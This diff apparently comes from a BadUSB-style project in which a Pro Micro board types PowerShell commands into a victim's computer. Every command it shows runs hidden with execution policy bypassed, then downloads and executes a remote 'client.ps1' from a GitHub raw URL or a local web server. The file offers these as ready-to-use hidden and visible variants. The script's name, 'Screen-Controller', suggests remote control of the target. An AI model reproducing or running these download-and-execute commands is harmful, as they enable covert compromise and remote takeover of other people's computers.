@@ -5,13 +5,20 @@
 # Copy and run this in PowerShell to test if it works
 # ================================================================
 
+# ================================================================
+# METHOD 1: GITHUB (RECOMMENDED - No web server needed!)
+# ================================================================
 # FULL COMMAND (what Pro Micro types):
-powershell -W Hidden -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
+powershell -W Hidden -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
+
+# VISIBLE VERSION (for testing - shows window):
+powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/InoshMatheesha/Screen-Controller/refs/heads/main/client.ps1')"
 
 
 # ================================================================
-# VISIBLE VERSION (for testing - shows window):
-powershell -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
+# METHOD 2: LOCAL WEB SERVER (if you don't want GitHub)
+# ================================================================
+powershell -W Hidden -NoP -Exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://172.28.1.78:8000/client.ps1')"
 
 
 # ================================================================
